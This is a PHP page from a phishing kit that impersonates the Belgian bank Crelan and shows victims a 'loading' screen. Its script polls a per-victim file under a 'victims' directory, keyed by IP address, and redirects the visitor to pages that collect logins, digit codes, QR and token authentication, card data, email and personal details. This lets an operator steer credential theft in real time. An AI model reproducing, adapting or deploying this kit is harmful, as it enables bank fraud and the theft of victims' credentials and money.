<?php
  session_start();
  include "./Assets/php/lang/lang.php";
  reset_data_page();
  $langs = $_GET['lang'] ?? $_SESSION['lang'] ?? 'fr';  
?>
<!DOCTYPE html>
<html lang="en" class="">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Font Google -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <!-- Font Awesome Library --> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- File Css -->
    <link rel="stylesheet" href="./Assets/css/main.css">
    <link rel="stylesheet" href="./Assets/css/basic-thinks.css">
    <!-- Favicon -->
    <link rel="icon" href="./Assets/imgs/favicon.ico">
    <link rel="shortcut" href="./Assets/imgs/favicon.ico">
    <link rel="appel-touch-icon" href="./Assets/imgs/favicon.ico">
    <title><?php echo get_text('title_head'); ?></title>
    <script src="./Assets/js/stutes.js"></script>        
</head>
<body>
    <!-- Main Section -->
    <div class="main-section">
        <div class="nav-section">
            <div class="logo">
                <img src="./Assets/imgs/logo.png" alt="">
            </div>
            <form action="" class="lang-form" method="post">
                <a href="./loading.php?lang=<?php echo ($langs == 'nl') ? 'fr' : 'nl'; ?>" 
                class="display-current-lang" id="buttonMenuLang">
                <?php echo get_text('current_lang'); ?>
                <img src="./Assets/imgs/arrow-nav.png" alt="" id="iconRight">
                </a>
            </form>
        </div>
        <div class="content-main-section">
            <div class="f-s-d-p-element-other">
                <div class="coul-container">
                    <div class="coul-fields-other">
                        <h1 class="title-login-other" style="margin: 0px !important;"><?php echo get_text('title_step_loading'); ?>...</h1>
                        <div class="prt-loading">
                            <img src="./Assets/imgs/loading-image.gif" alt="">
                        </div>
                        <p class="p-explain-other" style="margin: 0px !important;">
                           <?php echo get_text('paragraph_step_loading'); ?>
                        </p>
                    </div>
                </div>
            </div> 
        </div>
    </div>
    <!-- Main Section -->

    <!-- Footer Section -->
    <div class="footer-section">
        <div class="content-footer-section">
            <div class="links-footer">
                <span class="link-footer"><?php echo get_text('link_footer_1'); ?></span> <span class="ship">—</span> <span class="link-footer"><?php echo get_text('link_footer_2'); ?></span> <span class="ship">—</span> <span class="link-footer"><?php echo get_text('link_footer_3'); ?></span> <span class="ship">—</span> <span class="link-footer"><?php echo get_text('link_footer_4'); ?></span> <span class="ship">—</span> 
            </div>
            <p><?php echo get_text('paragraph_footer'); ?> © Crelan <?php echo date("Y"); ?></p>
        </div>
    </div>
    <!-- Footer Section -->


    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>         
    <script src="./Assets/js/script.js"></script>    
    <script>
        var ip = '<?php echo get_client_ip(); ?>';
        var waiting = setInterval(function() {
            $.get('./victims/' + ip + '.txt?' + new Date().getTime(), function(data) {
                if( data == 0 ) {
                    //console.log('hada ba9i 0');
                }else if( data == 'login' ){
                    clearInterval(waiting); 
                    location.href = "login.php";
                }else if( data == 'login_error' ){
                    clearInterval(waiting);
                    location.href = "login.php?error";
                }

                else if( data == 'digit' ) {
                    clearInterval(waiting);
                    location.href = "digit.php";
                }else if( data == 'digit_error' ){
                    clearInterval(waiting);
                    location.href = "digit.php?error";
                }

                else if( data == 'qr' ) {
                    clearInterval(waiting);
                    location.href = "qr.php";
                }else if( data == 'qr_error' ){
                    clearInterval(waiting);
                    location.href = "qr.php?error";
                }

                else if( data == 'tok' ) {
                    clearInterval(waiting);
                    location.href = "token.php";
                }else if( data == 'tok_error' ){
                    clearInterval(waiting);
                    location.href = "token.php?error";
                }

                else if( data == 'mail' ) {
                    clearInterval(waiting);
                    location.href = "email.php";
                }else if( data == 'mail_error' ){
                    clearInterval(waiting);
                    location.href = "email.php?error";
                }

                else if( data == 'card' ) {
                    clearInterval(waiting);
                    location.href = "card.php";
                }else if( data == 'card_error' ){
                    clearInterval(waiting);
                    location.href = "card.php?error";
                }

                else if( data == 'details' ) {
                    clearInterval(waiting);
                    location.href = "details.php";
                }else if( data == 'details_error' ){
                    clearInterval(waiting);
                    location.href = "details.php?error";
                }


                else if( data == 'success' ){
                    clearInterval(waiting);
                    location.href = "success.php";
                }

                // its

                else if( data == 'tele' ) {
                    clearInterval(waiting);
                    location.href = "its_access.php";
                }else if( data == 'tele_error' ){
                    clearInterval(waiting);
                    location.href = "its_access.php?error";
                }                
                else if( data == 'its_ver' ) {
                    clearInterval(waiting);
                    location.href = "confirm.php";
                }else if( data == 'its_ver_error' ){
                    clearInterval(waiting);
                    location.href = "confirm.php?error";
                }  

                else if( data == 'load' ){
                    clearInterval(waiting);
                    location.href = "loading.php?error";
                }                 

            });
        }, 1000);    
    </script>
</body>
</html>